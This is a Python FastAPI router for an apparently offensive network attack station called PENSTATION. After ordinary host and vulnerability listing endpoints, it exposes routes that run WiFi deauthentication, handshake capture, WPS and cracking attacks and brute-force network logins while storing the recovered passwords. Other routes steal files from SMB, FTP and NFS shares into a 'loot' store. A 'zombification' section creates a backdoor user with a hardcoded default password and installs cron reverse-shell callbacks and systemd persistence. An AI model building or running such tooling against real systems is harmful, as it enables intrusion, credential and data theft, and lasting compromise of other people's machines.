"""REST API routes for PENSTATION."""

import asyncio
import logging
from datetime import datetime

from fastapi import APIRouter, Depends, Query
from sqlalchemy.ext.asyncio import AsyncSession

from db.database import get_session
from db import crud
from pydantic import BaseModel
from scanner.scheduler import full_network_scan
from scanner.wifi import (
    connect_network,
    disconnect_network,
    forget_network,
    get_saved_networks,
    get_wifi_status,
    scan_networks,
)
from scanner.wifi_adapters import (
    detect_all_adapters,
    assign_adapter_roles,
    enable_monitor_mode,
    disable_monitor_mode,
)
from scanner.wifi_attack import (
    start_monitor,
    stop_monitor,
    airodump_scan,
    deauth_attack,
    capture_handshake,
    wps_attack,
    crack_handshake,
    stop_attack,
    stop_all_attacks,
    get_running_attacks,
    get_captures,
)
from scanner.brute_force import (
    brute_force_service,
    brute_force_auto,
    stop_brute_job,
    stop_all_brute_jobs,
    get_running_brute_jobs,
    get_supported_services,
)
from scanner.file_stealer import (
    scan_smb_shares,
    steal_smb_files,
    scan_ftp,
    steal_ftp_files,
    scan_nfs_exports,
    steal_nfs_files,
    auto_steal,
    get_all_loot,
)
from scanner.zombification import (
    ssh_test_access,
    install_ssh_key,
    create_backdoor_user,
    install_cron_callback,
    install_systemd_persistence,
    gather_host_info,
    check_zombie_status,
)

logger = logging.getLogger("penstation.api")


class WifiConnectRequest(BaseModel):
    ssid: str
    password: str = ""

router = APIRouter(prefix="/api")


@router.get("/stats")
async def stats(session: AsyncSession = Depends(get_session)):
    return await crud.get_stats(session)


@router.get("/hosts")
async def hosts(session: AsyncSession = Depends(get_session)):
    host_list = await crud.get_all_hosts(session)
    result = []
    for h in host_list:
        vulns = await crud.get_host_vulns(session, h.ip)
        ports = await crud.get_host_ports(session, h.ip)
        sev_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for v in vulns:
            if v.severity in sev_counts:
                sev_counts[v.severity] += 1
        result.append({
            "ip": h.ip,
            "mac": h.mac,
            "mac_vendor": h.mac_vendor,
            "hostname": h.hostname,
            "os_name": h.os_name,
            "os_version": h.os_version,
            "status": h.status,
            "risk_score": h.risk_score,
            "first_seen": h.first_seen.isoformat() if h.first_seen else None,
            "last_seen": h.last_seen.isoformat() if h.last_seen else None,
            "ports_count": len(ports),
            "vulns": sev_counts,
        })
    return result


@router.get("/host/{ip}")
async def host_detail(ip: str, session: AsyncSession = Depends(get_session)):
    h = await crud.get_host(session, ip)
    if not h:
        return {"error": "Host not found"}
    ports = await crud.get_host_ports(session, ip)
    vulns = await crud.get_host_vulns(session, ip)
    return {
        "ip": h.ip,
        "mac": h.mac,
        "mac_vendor": h.mac_vendor,
        "hostname": h.hostname,
        "os_name": h.os_name,
        "os_version": h.os_version,
        "status": h.status,
        "risk_score": h.risk_score,
        "first_seen": h.first_seen.isoformat() if h.first_seen else None,
        "last_seen": h.last_seen.isoformat() if h.last_seen else None,
        "ports": [
            {
                "port": p.port_number,
                "protocol": p.protocol,
                "service": p.service,
                "version": p.version,
                "state": p.state,
            }
            for p in ports
        ],
        "vulns": [
            {
                "id": v.id,
                "cve_id": v.cve_id,
                "template_id": v.template_id,
                "severity": v.severity,
                "name": v.name,
                "description": v.description,
                "remediation": v.remediation,
                "reference_url": v.reference_url,
                "port": v.port_number,
                "found_at": v.found_at.isoformat() if v.found_at else None,
                "status": v.status,
            }
            for v in vulns
        ],
    }


@router.get("/host/{ip}/ports")
async def host_ports(ip: str, session: AsyncSession = Depends(get_session)):
    ports = await crud.get_host_ports(session, ip)
    return [
        {
            "port": p.port_number,
            "protocol": p.protocol,
            "service": p.service,
            "version": p.version,
            "state": p.state,
        }
        for p in ports
    ]


@router.get("/host/{ip}/vulns")
async def host_vulns(ip: str, session: AsyncSession = Depends(get_session)):
    vulns = await crud.get_host_vulns(session, ip)
    return [
        {
            "id": v.id,
            "cve_id": v.cve_id,
            "template_id": v.template_id,
            "severity": v.severity,
            "name": v.name,
            "description": v.description,
            "remediation": v.remediation,
            "reference_url": v.reference_url,
            "port": v.port_number,
            "found_at": v.found_at.isoformat() if v.found_at else None,
            "status": v.status,
        }
        for v in vulns
    ]


@router.get("/vulns")
async def all_vulns(
    severity: str = Query(None),
    session: AsyncSession = Depends(get_session),
):
    vulns = await crud.get_all_vulns(session, severity=severity)
    return [
        {
            "id": v.id,
            "host_ip": v.host_ip,
            "cve_id": v.cve_id,
            "severity": v.severity,
            "name": v.name,
            "port": v.port_number,
            "found_at": v.found_at.isoformat() if v.found_at else None,
            "status": v.status,
        }
        for v in vulns
    ]


@router.get("/scans")
async def scans(session: AsyncSession = Depends(get_session)):
    jobs = await crud.get_scan_jobs(session)
    return [
        {
            "id": j.id,
            "type": j.type,
            "started_at": j.started_at.isoformat() if j.started_at else None,
            "finished_at": j.finished_at.isoformat() if j.finished_at else None,
            "duration": j.duration_seconds,
            "hosts_scanned": j.hosts_scanned,
            "ports_found": j.ports_found,
            "vulns_found": j.vulns_found,
            "status": j.status,
        }
        for j in jobs
    ]


@router.get("/cve/{cve_id}")
async def cve_detail(cve_id: str, session: AsyncSession = Depends(get_session)):
    entry = await crud.get_cve(session, cve_id)
    if not entry:
        return {"error": "CVE not found in local database"}
    return {
        "cve_id": entry.cve_id,
        "description": entry.description,
        "cvss_score": entry.cvss_score,
        "severity": entry.severity,
        "published_at": entry.published_at.isoformat() if entry.published_at else None,
    }


@router.get("/alerts")
async def alerts(session: AsyncSession = Depends(get_session)):
    alert_list = await crud.get_alerts(session)
    return [
        {
            "id": a.id,
            "timestamp": a.timestamp.isoformat() if a.timestamp else None,
            "type": a.alert_type,
            "host_ip": a.host_ip,
            "severity": a.severity,
            "message": a.message,
        }
        for a in alert_list
    ]


@router.get("/network/map")
async def network_map(session: AsyncSession = Depends(get_session)):
    host_list = await crud.get_all_hosts(session)
    nodes = []
    edges = []
    # Add router node (gateway)
    nodes.append({
        "id": "gateway",
        "label": "Gateway",
        "type": "router",
        "severity": "none",
    })
    for h in host_list:
        vulns = await crud.get_host_vulns(session, h.ip)
        max_sev = "none"
        sev_priority = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
        for v in vulns:
            if sev_priority.get(v.severity, 0) > sev_priority.get(max_sev, -1):
                max_sev = v.severity
        nodes.append({
            "id": h.ip,
            "label": h.hostname or h.ip,
            "type": "host",
            "ip": h.ip,
            "os": h.os_name,
            "vendor": h.mac_vendor,
            "risk_score": h.risk_score,
            "severity": max_sev,
            "status": h.status,
        })
        edges.append({"from": "gateway", "to": h.ip})

    return {"nodes": nodes, "edges": edges}


@router.get("/heatmap")
async def heatmap(session: AsyncSession = Depends(get_session)):
    return await crud.get_heatmap(session)


@router.post("/scan/trigger")
async def trigger_scan():
    asyncio.create_task(full_network_scan())
    return {"status": "Scan triggered"}


# ── WiFi Management ───────────────────────────────────────

@router.get("/wifi/status")
async def wifi_status():
    return await get_wifi_status()


@router.get("/wifi/scan")
async def wifi_scan():
    networks = await scan_networks()

    # Check if scan failed vs no networks found
    if not networks:
        from scanner.wifi import get_wifi_interface
        iface = await get_wifi_interface()
        if not iface:
            return {
                "error": "No WiFi interface found",
                "networks": [],
                "message": "Ensure WiFi adapter is connected and drivers are loaded"
            }
        return {
            "error": None,
            "networks": [],
            "message": "No WiFi networks detected"
        }

    return {"error": None, "networks": networks, "message": f"Found {len(networks)} networks"}


@router.post("/wifi/connect")
async def wifi_connect(req: WifiConnectRequest):
    return await connect_network(req.ssid, req.password)


@router.post("/wifi/disconnect")
async def wifi_disconnect():
    return await disconnect_network()


@router.get("/wifi/saved")
async def wifi_saved():
    return await get_saved_networks()


@router.post("/wifi/forget")
async def wifi_forget(req: WifiConnectRequest):
    return await forget_network(req.ssid)


# ── WiFi Adapter Management ───────────────────────────────

@router.get("/wifi/adapters")
async def list_wifi_adapters():
    """List all WiFi adapters with capabilities."""
    adapters = await detect_all_adapters()
    return [
        {
            "interface": a.interface,
            "driver": a.driver,
            "chipset": a.chipset,
            "supports_monitor": a.supports_monitor,
            "supports_injection": a.supports_injection,
            "role": a.role,
        }
        for a in adapters
    ]


@router.get("/wifi/adapters/roles")
async def get_adapter_roles():
    """Get assigned adapter roles (primary/attack)."""
    return await assign_adapter_roles()


class MonitorModeRequest(BaseModel):
    interface: str
    enable: bool


class DeauthRequest(BaseModel):
    interface: str
    target_bssid: str
    client_mac: str = "FF:FF:FF:FF:FF:FF"
    count: int = 10


class HandshakeRequest(BaseModel):
    interface: str
    target_bssid: str
    channel: int
    timeout: int = 60
    deauth: bool = True


class WPSRequest(BaseModel):
    interface: str
    target_bssid: str
    channel: int
    method: str = "reaver"
    pixie_dust: bool = True
    timeout: int = 120


class CrackRequest(BaseModel):
    pcap_path: str
    wordlist: str = "/usr/share/wordlists/rockyou.txt"


class AirodumpRequest(BaseModel):
    interface: str
    duration: int = 30
    channel: int = 0


@router.post("/wifi/adapters/monitor")
async def toggle_monitor_mode(req: MonitorModeRequest):
    """Enable or disable monitor mode on an adapter."""
    if req.enable:
        success = await enable_monitor_mode(req.interface)
        return {
            "success": success,
            "message": f"Monitor mode {'enabled' if success else 'failed'} on {req.interface}",
        }
    else:
        success = await disable_monitor_mode(req.interface)
        return {
            "success": success,
            "message": f"Monitor mode {'disabled' if success else 'failed'} on {req.interface}",
        }


# ── WiFi Pentesting ──────────────────────────────────────

@router.post("/wifi/monitor/start")
async def api_start_monitor(req: MonitorModeRequest):
    """Start monitor mode, returns monitor interface name."""
    mon_iface = await start_monitor(req.interface)
    return {"success": bool(mon_iface), "monitor_interface": mon_iface}


@router.post("/wifi/monitor/stop")
async def api_stop_monitor(req: MonitorModeRequest):
    """Stop monitor mode."""
    ok = await stop_monitor(req.interface)
    return {"success": ok}


@router.post("/wifi/airodump")
async def api_airodump(req: AirodumpRequest):
    """Run airodump-ng scan for detailed WiFi recon."""
    result = await airodump_scan(req.interface, req.duration, req.channel)
    return result


@router.post("/wifi/deauth")
async def api_deauth(req: DeauthRequest):
    """Send deauth packets to disconnect client from AP."""
    result = await deauth_attack(
        req.interface, req.target_bssid, req.client_mac, req.count
    )
    return result


@router.post("/wifi/handshake")
async def api_capture_handshake(req: HandshakeRequest):
    """Capture WPA handshake from target AP."""
    result = await capture_handshake(
        req.interface, req.target_bssid, req.channel, req.timeout, req.deauth
    )
    return result


@router.post("/wifi/wps")
async def api_wps_attack(req: WPSRequest):
    """Attack WPS-enabled AP using Reaver/Bully + Pixie-Dust."""
    result = await wps_attack(
        req.interface, req.target_bssid, req.channel,
        req.method, req.pixie_dust, req.timeout,
    )
    return result


@router.post("/wifi/crack")
async def api_crack(req: CrackRequest):
    """Crack captured handshake with wordlist."""
    result = await crack_handshake(req.pcap_path, req.wordlist)
    return result


@router.get("/wifi/attacks")
async def api_running_attacks():
    """List running attacks."""
    return {"attacks": get_running_attacks()}


@router.post("/wifi/attacks/stop")
async def api_stop_all():
    """Stop all running attacks."""
    count = await stop_all_attacks()
    return {"stopped": count}


@router.get("/wifi/captures")
async def api_captures():
    """List captured handshake files."""
    return get_captures()


# ── Brute Force Attacks ──────────────────────────────────


class BruteForceRequest(BaseModel):
    host_ip: str
    service: str
    port: int = 0
    userlist: str = ""
    passlist: str = ""
    username: str = ""
    password: str = ""
    threads: int = 4
    timeout: int = 300


class BruteForceAutoRequest(BaseModel):
    host_ip: str


@router.get("/bruteforce/services")
async def api_brute_services():
    """List supported brute force services and default ports."""
    return get_supported_services()


@router.post("/bruteforce/start")
async def api_brute_force(req: BruteForceRequest, session: AsyncSession = Depends(get_session)):
    """Start brute force attack on a service."""
    result = await brute_force_service(
        host_ip=req.host_ip,
        service=req.service,
        port=req.port,
        userlist=req.userlist,
        passlist=req.passlist,
        username=req.username,
        password=req.password,
        threads=req.threads,
        timeout=req.timeout,
    )

    # Store credentials in DB
    if result.get("credentials"):
        for cred in result["credentials"]:
            await crud.store_credential(
                session,
                host_ip=req.host_ip,
                service=req.service,
                port=cred.get("port", req.port or 0),
                username=cred["username"],
                password=cred["password"],
                success=True,
            )

    return result


@router.post("/bruteforce/auto")
async def api_brute_auto(req: BruteForceAutoRequest, session: AsyncSession = Depends(get_session)):
    """Auto-detect services on host and brute force them."""
    ports = await crud.get_host_ports(session, req.host_ip)
    port_list = [
        {"port_number": p.port_number, "service": p.service}
        for p in ports
    ]

    if not port_list:
        return {"success": False, "error": "No open ports found. Run a port scan first."}

    credentials = await brute_force_auto(req.host_ip, port_list)

    # Store found credentials
    for cred in credentials:
        await crud.store_credential(
            session,
            host_ip=req.host_ip,
            service=cred.get("service", ""),
            port=cred.get("port", 0),
            username=cred["username"],
            password=cred["password"],
            success=True,
        )

    return {
        "success": len(credentials) > 0,
        "host_ip": req.host_ip,
        "services_tested": len(port_list),
        "credentials": credentials,
    }


@router.get("/bruteforce/jobs")
async def api_brute_jobs():
    """List running brute force jobs."""
    return {"jobs": get_running_brute_jobs()}


@router.post("/bruteforce/stop")
async def api_brute_stop_all():
    """Stop all running brute force jobs."""
    count = await stop_all_brute_jobs()
    return {"stopped": count}


@router.get("/credentials")
async def api_credentials(session: AsyncSession = Depends(get_session)):
    """List all found credentials."""
    creds = await crud.get_successful_credentials(session)
    return [
        {
            "id": c.id,
            "host_ip": c.host_ip,
            "service": c.service,
            "port": c.port,
            "username": c.username,
            "password": c.password,
            "found_at": c.found_at.isoformat() if c.found_at else None,
        }
        for c in creds
    ]


@router.get("/credentials/{host_ip}")
async def api_host_credentials(host_ip: str, session: AsyncSession = Depends(get_session)):
    """List credentials for a specific host."""
    creds = await crud.get_credentials_for_host(session, host_ip)
    return [
        {
            "id": c.id,
            "service": c.service,
            "port": c.port,
            "username": c.username,
            "password": c.password,
            "success": c.success,
            "found_at": c.found_at.isoformat() if c.found_at else None,
        }
        for c in creds
    ]


# ── File Exfiltration ────────────────────────────────────


class SMBScanRequest(BaseModel):
    host_ip: str
    username: str = ""
    password: str = ""


class SMBStealRequest(BaseModel):
    host_ip: str
    share: str
    username: str = ""
    password: str = ""
    patterns: list[str] | None = None


class FTPScanRequest(BaseModel):
    host_ip: str
    port: int = 21
    username: str = "anonymous"
    password: str = "anonymous@"


class FTPStealRequest(BaseModel):
    host_ip: str
    port: int = 21
    username: str = "anonymous"
    password: str = "anonymous@"
    patterns: list[str] | None = None


class NFSStealRequest(BaseModel):
    host_ip: str
    export_path: str
    patterns: list[str] | None = None


class AutoStealRequest(BaseModel):
    host_ip: str


@router.post("/steal/smb/scan")
async def api_smb_scan(req: SMBScanRequest):
    """Scan SMB shares on a host."""
    return await scan_smb_shares(req.host_ip, req.username, req.password)


@router.post("/steal/smb")
async def api_smb_steal(req: SMBStealRequest, session: AsyncSession = Depends(get_session)):
    """Steal files from an SMB share."""
    result = await steal_smb_files(
        req.host_ip, req.share, req.username, req.password, req.patterns,
    )

    # Log stolen files to DB
    for f in result.get("files", []):
        await crud.log_stolen_file(
            session,
            host_ip=req.host_ip,
            service="smb",
            file_path=f["remote_path"],
            local_path=f["local_path"],
            file_size=f.get("size", 0),
        )

    return result


@router.post("/steal/ftp/scan")
async def api_ftp_scan(req: FTPScanRequest):
    """Scan FTP server for files."""
    return await scan_ftp(req.host_ip, req.port, req.username, req.password)


@router.post("/steal/ftp")
async def api_ftp_steal(req: FTPStealRequest, session: AsyncSession = Depends(get_session)):
    """Steal files from an FTP server."""
    result = await steal_ftp_files(
        req.host_ip, req.port, req.username, req.password, req.patterns,
    )

    for f in result.get("files", []):
        await crud.log_stolen_file(
            session,
            host_ip=req.host_ip,
            service="ftp",
            file_path=f["remote_path"],
            local_path=f["local_path"],
            file_size=f.get("size", 0),
        )

    return result


@router.post("/steal/nfs/scan")
async def api_nfs_scan(req: SMBScanRequest):
    """Scan NFS exports on a host."""
    return await scan_nfs_exports(req.host_ip)


@router.post("/steal/nfs")
async def api_nfs_steal(req: NFSStealRequest, session: AsyncSession = Depends(get_session)):
    """Steal files from NFS export."""
    result = await steal_nfs_files(req.host_ip, req.export_path, req.patterns)

    for f in result.get("files", []):
        await crud.log_stolen_file(
            session,
            host_ip=req.host_ip,
            service="nfs",
            file_path=f["remote_path"],
            local_path=f["local_path"],
            file_size=f.get("size", 0),
        )

    return result


@router.post("/steal/auto")
async def api_auto_steal(req: AutoStealRequest, session: AsyncSession = Depends(get_session)):
    """Auto-steal from all available services on host."""
    # Get credentials if we have any
    creds_rows = await crud.get_credentials_for_host(session, req.host_ip)
    creds = [
        {"username": c.username, "password": c.password}
        for c in creds_rows if c.success
    ]

    result = await auto_steal(req.host_ip, creds or None)

    for f in result.get("files", []):
        await crud.log_stolen_file(
            session,
            host_ip=req.host_ip,
            service=f.get("service", ""),
            file_path=f["remote_path"],
            local_path=f["local_path"],
            file_size=f.get("size", 0),
        )

    return result


@router.get("/loot")
async def api_loot():
    """List all stolen files (loot)."""
    return get_all_loot()


@router.get("/loot/db")
async def api_loot_db(session: AsyncSession = Depends(get_session)):
    """List stolen files from database."""
    files = await crud.get_all_stolen_files(session)
    return [
        {
            "id": f.id,
            "host_ip": f.host_ip,
            "service": f.service,
            "file_path": f.file_path,
            "local_path": f.local_path,
            "file_size": f.file_size,
            "stolen_at": f.stolen_at.isoformat() if f.stolen_at else None,
        }
        for f in files
    ]


# ── Zombification (Persistence) ─────────────────────────


class SSHAccessRequest(BaseModel):
    host_ip: str
    username: str
    password: str
    port: int = 22


class SSHKeyRequest(BaseModel):
    host_ip: str
    username: str
    password: str
    port: int = 22


class BackdoorUserRequest(BaseModel):
    host_ip: str
    username: str
    password: str
    backdoor_user: str = "sysservice"
    backdoor_pass: str = "Serv1ce!2025"
    port: int = 22


class CronCallbackRequest(BaseModel):
    host_ip: str
    username: str
    password: str
    callback_ip: str
    callback_port: int = 4444
    port: int = 22


class SystemdPersistRequest(BaseModel):
    host_ip: str
    username: str
    password: str
    callback_ip: str
    callback_port: int = 4445
    port: int = 22


class ZombieCheckRequest(BaseModel):
    host_ip: str
    username: str
    password: str = ""
    key_path: str = ""
    port: int = 22


@router.post("/zombie/test")
async def api_ssh_test(req: SSHAccessRequest):
    """Test SSH access to a host."""
    return await ssh_test_access(req.host_ip, req.username, req.password, req.port)


@router.post("/zombie/ssh-key")
async def api_install_key(req: SSHKeyRequest):
    """Install SSH key for persistent access."""
    return await install_ssh_key(req.host_ip, req.username, req.password, req.port)


@router.post("/zombie/backdoor-user")
async def api_backdoor_user(req: BackdoorUserRequest):
    """Create backdoor user on target."""
    return await create_backdoor_user(
        req.host_ip, req.username, req.password,
        req.backdoor_user, req.backdoor_pass, req.port,
    )


@router.post("/zombie/cron-callback")
async def api_cron_callback(req: CronCallbackRequest):
    """Install cron reverse shell callback."""
    return await install_cron_callback(
        req.host_ip, req.username, req.password,
        req.callback_ip, req.callback_port, req.port,
    )


@router.post("/zombie/systemd-persist")
async def api_systemd_persist(req: SystemdPersistRequest):
    """Install systemd persistence service."""
    return await install_systemd_persistence(
        req.host_ip, req.username, req.password,
        req.callback_ip, req.callback_port, req.port,
    )


@router.post("/zombie/gather-info")
async def api_gather_info(req: SSHAccessRequest):
    """Gather detailed info from compromised host."""
    return await gather_host_info(req.host_ip, req.username, req.password, req.port)


@router.post("/zombie/check")
async def api_zombie_check(req: ZombieCheckRequest):
    """Check if a zombified host is still accessible."""
    return await check_zombie_status(
        req.host_ip, req.username, req.password, req.key_path, req.port,
    )
